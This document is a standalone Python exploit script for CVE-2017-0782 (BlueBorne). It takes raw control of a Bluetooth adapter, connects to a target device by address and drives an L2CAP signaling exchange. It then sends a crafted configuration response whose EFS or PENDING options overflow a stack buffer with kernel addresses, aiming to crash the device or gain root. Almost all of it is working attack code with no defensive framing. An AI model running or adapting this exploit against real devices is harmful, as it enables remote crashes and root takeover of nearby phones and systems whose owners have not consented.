#!/usr/bin/env python3
"""
bluborne_efs_v3.py — CVE-2017-0782 L2CAP Stack Overflow
Uses Scapy BluetoothUserSocket for HCI_CHANNEL_USER (exclusive adapter control).
This bypasses the Kali kernel's L2CAP layer that was eating our signaling packets.

Run: sudo python3 bluborne_efs_v3.py 02:00:00:00:00:21 [info|crash|spray]
"""
import struct
import subprocess
import sys
import time
import os

TARGET = sys.argv[1] if len(sys.argv) > 1 else '02:00:00:00:00:21'
MODE = sys.argv[2] if len(sys.argv) > 2 else 'info'

COMMIT_CREDS        = 0xC0054328
PREPARE_KERNEL_CRED = 0xC00548E0

# L2CAP
L2CAP_CID_SIG = 0x0001
L2CAP_CONN_REQ = 0x02
L2CAP_CONN_RSP = 0x03
L2CAP_CONF_REQ = 0x04
L2CAP_CONF_RSP = 0x05
L2CAP_INFO_REQ = 0x0A
L2CAP_INFO_RSP = 0x0B

L2CAP_CONF_SUCCESS  = 0x0000
L2CAP_CONF_UNACCEPT = 0x0001
L2CAP_CONF_PENDING  = 0x0004
L2CAP_CONF_EFS = 0x06
L2CAP_CONF_MTU = 0x01

PSM_SDP  = 0x0001
OUR_SCID = 0x0040

def l2cap_cmd(code, ident, data):
    return struct.pack('<BBH', code, ident, len(data)) + data

def build_efs_overflow(ident, dcid, addr):
    """UNACCEPT + EFS amplification: each short EFS (3 bytes in) → 18 bytes out."""
    addr_le = struct.pack('<I', addr)
    # First EFS: full 18-byte option with addr at known offsets
    efs_full = bytes([0x01, 0x01]) + struct.pack('<H', 0x0200) + addr_le * 3
    options = bytes([L2CAP_CONF_EFS, 16]) + efs_full  # 18 bytes output
    # 14 short EFS options: 3 bytes each → 18 bytes output each = 252 bytes more
    # Total output: 18 + 252 = 270 bytes into buf[64] → 206 byte overflow
    for _ in range(14):
        options += bytes([L2CAP_CONF_EFS, 1, 0x01])
    payload = struct.pack('<HHH', dcid, 0, L2CAP_CONF_UNACCEPT) + options
    return l2cap_cmd(L2CAP_CONF_RSP, ident, payload)

def build_pending_overflow(ident, dcid, addr):
    """PENDING path: no length validation at all."""
    addr_le = struct.pack('<I', addr)
    efs_full = bytes([0x01, 0x01]) + struct.pack('<H', 0x0200) + addr_le * 3
    options = b''
    # Fill buf[64] with MTU options first
    for _ in range(15):
        options += bytes([L2CAP_CONF_MTU, 2, 0x00, 0x02])  # 4 bytes each = 60
    # Now overflow with EFS containing shellcode addr
    for _ in range(12):
        options += bytes([L2CAP_CONF_EFS, 16]) + efs_full  # 18 bytes each = 216
    payload = struct.pack('<HHH', dcid, 0, L2CAP_CONF_PENDING) + options
    return l2cap_cmd(L2CAP_CONF_RSP, ident, payload)

def send_acl(sock, handle, cid, payload):
    """Send L2CAP data over ACL."""
    l2cap = struct.pack('<HH', len(payload), cid) + payload
    flags = 0x0  # PB=00, BC=00
    acl_hdr = struct.pack('<HH', (handle & 0x0FFF) | (flags << 12), len(l2cap))
    pkt = b'\x02' + acl_hdr + l2cap
    sock.send(pkt)

def parse_acl(data):
    """Parse ACL data packet. Returns (handle, l2cap_len, l2cap_cid, l2cap_data) or None."""
    if len(data) < 9 or data[0] != 0x02:
        return None
    handle = struct.unpack('<H', data[1:3])[0] & 0x0FFF
    acl_len = struct.unpack('<H', data[3:5])[0]
    l2_len, l2_cid = struct.unpack('<HH', data[5:9])
    l2_data = data[9:9+l2_len]
    return handle, l2_len, l2_cid, l2_data

def main():
    if os.getuid() != 0:
        print('Need root'); sys.exit(1)

    overflow_addr = {'crash': 0xDEADBEEF, 'spray': PREPARE_KERNEL_CRED, 'info': None}[MODE]

    print('=' * 60)
    print(f'  CVE-2017-0782 — BlueBorne EFS v3 (Scapy HCI_CHANNEL_USER)')
    print(f'  Target: {TARGET}  Mode: {MODE}')
    if overflow_addr:
        print(f'  Overflow addr: 0x{overflow_addr:08X}')
    print('=' * 60)

    # Step 1: Stop bluetoothd, bring adapter down (required for HCI_CHANNEL_USER)
    print('[*] Stopping bluetoothd and bringing adapter down...')
    subprocess.run(['systemctl', 'stop', 'bluetooth'], capture_output=True)
    time.sleep(0.5)
    subprocess.run(['hciconfig', 'hci0', 'down'], capture_output=True)
    time.sleep(0.5)

    # Step 2: Open BluetoothUserSocket (HCI_CHANNEL_USER = exclusive control)
    print('[*] Opening Scapy BluetoothUserSocket (HCI_CHANNEL_USER)...')
    from scapy.all import BluetoothUserSocket
    try:
        sock = BluetoothUserSocket(0)
        print('[+] HCI_CHANNEL_USER socket opened — exclusive adapter control!')
    except Exception as e:
        print(f'[-] Failed: {e}')
        print('    Make sure bluetoothd is stopped and adapter is DOWN')
        return False

    # Step 3: Reset and init the adapter via HCI commands
    print('[*] Resetting adapter via HCI...')
    # HCI Reset (OGF=0x03, OCF=0x0003)
    sock.send(struct.pack('<BHB', 0x01, 0x0C03, 0))
    time.sleep(0.5)

    # Read BD addr (OGF=0x04, OCF=0x0009)
    sock.send(struct.pack('<BHB', 0x01, 0x1009, 0))
    time.sleep(0.3)

    # Set scan enable (discoverable+connectable)
    sock.send(struct.pack('<BHB B', 0x01, 0x0C1A, 1, 0x03))
    time.sleep(0.3)

    # Drain responses
    for _ in range(10):
        try:
            d = sock.recv()
            if d and len(d) > 3:
                if d[0] == 0x04:  # HCI Event
                    evt_code = d[1]
                    if evt_code == 0x0E:  # Command Complete
                        if len(d) > 6:
                            opcode = struct.unpack('<H', d[4:6])[0]
                            print(f'  [EVT] Command Complete: opcode=0x{opcode:04x}')
        except:
            break

    # Step 4: Create ACL connection to target
    target_bytes = bytes(reversed([int(x, 16) for x in TARGET.split(':')]))
    print(f'[*] Creating ACL connection to {TARGET}...')
    # HCI Create Connection (OGF=0x01, OCF=0x0005)
    # bd_addr(6) + pkt_type(2) + page_scan_rep(1) + reserved(1) + clock_offset(2) + allow_role_switch(1)
    create_conn = target_bytes + struct.pack('<HBBHB', 0xCC18, 0x02, 0x00, 0x0000, 0x01)
    sock.send(struct.pack('<BHB', 0x01, 0x0405, len(create_conn)) + create_conn)

    # Wait for Connection Complete event
    handle = None
    for _ in range(50):
        try:
            d = sock.recv()
            if not d:
                time.sleep(0.1)
                continue
            if d[0] == 0x04:  # HCI Event
                evt = d[1]
                if evt == 0x03 and len(d) >= 11:  # Connection Complete
                    status = d[3]
                    handle = struct.unpack('<H', d[4:6])[0] & 0x0FFF
                    bd = d[6:12]
                    print(f'  [EVT] Connection Complete: status={status}, handle={handle}')
                    if status != 0:
                        print(f'[-] Connection failed with status {status}')
                        handle = None
                    break
                elif evt == 0x0F:  # Command Status
                    status = d[3]
                    if status != 0:
                        opcode = struct.unpack('<H', d[5:7])[0] if len(d) > 6 else 0
                        print(f'  [EVT] Command Status: status={status}, opcode=0x{opcode:04x}')
                elif evt != 0x13:  # Skip num_completed_packets
                    print(f'  [EVT] code=0x{evt:02x} len={d[2]}')
        except Exception as e:
            time.sleep(0.1)

    if handle is None:
        print('[-] Could not establish ACL connection')
        sock.close()
        return False

    print(f'[+] ACL connected! handle={handle}')

    # Step 5: Send L2CAP CONN_REQ
    print(f'[*] Sending L2CAP CONN_REQ (PSM=SDP, SCID=0x{OUR_SCID:04x})...')
    conn_req = l2cap_cmd(L2CAP_CONN_REQ, 0x01, struct.pack('<HH', PSM_SDP, OUR_SCID))
    send_acl(sock, handle, L2CAP_CID_SIG, conn_req)

    # Step 6: State machine — handle responses
    target_dcid = None
    conf_ident = None
    sent_exploit = False
    next_ident = 2
    target_pending = False
    got_conf_rsp = False

    print('[*] Listening for L2CAP responses...')
    for iteration in range(200):
        try:
            data = sock.recv()
        except:
            time.sleep(0.05)
            continue

        if not data or len(data) < 1:
            time.sleep(0.05)
            continue

        pkt_type = data[0]

        if pkt_type == 0x02:  # ACL Data
            parsed = parse_acl(data)
            if not parsed:
                continue
            h, l2_len, l2_cid, l2_data = parsed

            if l2_cid == L2CAP_CID_SIG and len(l2_data) >= 4:
                sig_code = l2_data[0]
                sig_ident = l2_data[1]
                sig_len = struct.unpack('<H', l2_data[2:4])[0]
                sig_data = l2_data[4:4+sig_len]

                if sig_code == L2CAP_INFO_REQ and len(sig_data) >= 2:
                    info_type = struct.unpack('<H', sig_data[:2])[0]
                    print(f'  [<-] INFO_REQ type=0x{info_type:04x}')
                    if info_type == 0x0002:  # Extended features
                        rsp = l2cap_cmd(L2CAP_INFO_RSP, sig_ident,
                            struct.pack('<HHI', 0x0002, 0, 0x00B8))  # EFS + FCS
                    elif info_type == 0x0003:  # Fixed channels
                        rsp = l2cap_cmd(L2CAP_INFO_RSP, sig_ident,
                            struct.pack('<HH', 0x0003, 0) + b'\x02' + b'\x00'*7)
                    else:
                        rsp = l2cap_cmd(L2CAP_INFO_RSP, sig_ident,
                            struct.pack('<HH', info_type, 1))
                    send_acl(sock, handle, L2CAP_CID_SIG, rsp)
                    print(f'  [->] INFO_RSP')

                elif sig_code == L2CAP_CONN_RSP and len(sig_data) >= 8:
                    dcid, scid, result, status = struct.unpack('<HHHH', sig_data[:8])
                    print(f'  [<-] CONN_RSP dcid=0x{dcid:04x} scid=0x{scid:04x} result={result} status={status}')
                    if result == 0:
                        target_dcid = dcid
                        print(f'  [+] L2CAP channel established! DCID=0x{dcid:04x}')
                    elif result == 1:  # Pending
                        print(f'  [*] Connection pending...')

                elif sig_code == L2CAP_CONF_REQ and len(sig_data) >= 4:
                    req_dcid = struct.unpack('<H', sig_data[:2])[0]
                    opts_hex = sig_data[4:].hex() if len(sig_data) > 4 else ''
                    print(f'  [<-] CONF_REQ dcid=0x{req_dcid:04x} opts={opts_hex}')
                    conf_ident = sig_ident

                    # Reply SUCCESS to their config
                    rsp = l2cap_cmd(L2CAP_CONF_RSP, sig_ident,
                        struct.pack('<HHH', req_dcid, 0, L2CAP_CONF_SUCCESS))
                    send_acl(sock, handle, L2CAP_CID_SIG, rsp)
                    print(f'  [->] CONF_RSP(SUCCESS)')

                    # Send OUR CONF_REQ to trigger their CONF_RSP
                    if target_dcid:
                        mtu_opt = bytes([L2CAP_CONF_MTU, 2, 0x00, 0x02])  # MTU=512
                        creq = l2cap_cmd(L2CAP_CONF_REQ, next_ident,
                            struct.pack('<HH', target_dcid, 0) + mtu_opt)
                        send_acl(sock, handle, L2CAP_CID_SIG, creq)
                        next_ident += 1
                        print(f'  [->] CONF_REQ (our request)')

                elif sig_code == L2CAP_CONF_RSP and len(sig_data) >= 6:
                    rsp_scid, rsp_flags, rsp_result = struct.unpack('<HHH', sig_data[:6])
                    print(f'  [<-] CONF_RSP scid=0x{rsp_scid:04x} result={rsp_result}')
                    got_conf_rsp = True
                    if rsp_result == L2CAP_CONF_PENDING:
                        target_pending = True

                    # === THIS IS WHERE WE SEND THE EXPLOIT ===
                    if not sent_exploit and target_dcid and MODE != 'info':
                        method = "PENDING (unlimited)" if target_pending else "UNACCEPT+EFS (amplified)"
                        print(f'\n{"="*60}')
                        print(f'  [!] SENDING OVERFLOW!')
                        print(f'  [!] Target DCID: 0x{target_dcid:04x}')
                        print(f'  [!] Method: {method}')
                        print(f'  [!] Addr: 0x{overflow_addr:08X}')
                        print(f'{"="*60}')
                        time.sleep(2)

                        if target_pending:
                            overflow = build_pending_overflow(next_ident, target_dcid, overflow_addr)
                        else:
                            overflow = build_efs_overflow(next_ident, target_dcid, overflow_addr)

                        send_acl(sock, handle, L2CAP_CID_SIG, overflow)
                        sent_exploit = True
                        print(f'[+] OVERFLOW SENT! ({len(overflow)} bytes L2CAP signaling)')
                        time.sleep(5)
                        break

                else:
                    print(f'  [<-] L2CAP SIG code=0x{sig_code:02x} ident={sig_ident}')

            elif l2_cid != 0:
                print(f'  [<-] ACL data on CID=0x{l2_cid:04x} ({l2_len} bytes)')

        elif pkt_type == 0x04:  # HCI Event
            if len(data) >= 3:
                evt = data[1]
                if evt == 0x05:  # Disconnect Complete
                    print('  [EVT] Disconnected!')
                    break
                elif evt == 0x13:  # Num Completed Packets (skip)
                    pass
                else:
                    print(f'  [EVT] code=0x{evt:02x}')

    # Results
    print(f'\n{"="*60}')
    if MODE == 'info':
        print(f'  INFO RESULTS:')
        print(f'    ACL handle: {handle}')
        print(f'    Target DCID: {f"0x{target_dcid:04x}" if target_dcid else "NOT OBTAINED"}')
        print(f'    CONF_REQ received: {conf_ident is not None}')
        print(f'    CONF_RSP received: {got_conf_rsp}')
        print(f'    Target sent PENDING: {target_pending}')
        if target_dcid:
            print(f'    Best path: {"PENDING (unlimited)" if target_pending else "UNACCEPT+EFS (amplified)"}')
            print(f'    [+] Ready for exploit! Run with "crash" or "spray" mode.')
        else:
            print(f'    [-] No DCID — target may have rejected our PSM')
    elif sent_exploit:
        print('[*] Checking if target alive...')
        time.sleep(2)
        # Re-init adapter briefly for l2ping
        sock.close()
        subprocess.run(['hciconfig', 'hci0', 'up'], capture_output=True)
        time.sleep(1)
        try:
            r = subprocess.run(['l2ping', '-c', '1', '-t', '5', TARGET],
                             capture_output=True, text=True, timeout=10)
            alive = 'received' in r.stdout
        except:
            alive = False

        if alive:
            print('  [*] Target still alive — overflow may not have reached saved regs')
            print('  [*] Try adjusting EFS option count or using PENDING path')
        else:
            print('  [!] TARGET NOT RESPONDING!')
            if MODE == 'crash':
                print('  [+] *** CRASH CONFIRMED — CVE-2017-0782 EXPLOITABLE! ***')
            else:
                print('  [+] Shellcode may have executed. Check device for root.')
    else:
        print('  [-] Exploit not sent — state machine did not reach exploit point')
        print(f'       DCID obtained: {target_dcid is not None}')
        print(f'       CONF exchange: {got_conf_rsp}')
    print('=' * 60)

    try:
        # Disconnect ACL
        disc = struct.pack('<HBB', handle & 0x0FFF, 0x13, 0)  # reason: remote user terminated
        sock.send(struct.pack('<BHB', 0x01, 0x0406, len(disc)) + disc)
    except:
        pass
    sock.close()
    return True

if __name__ == '__main__':
    main()
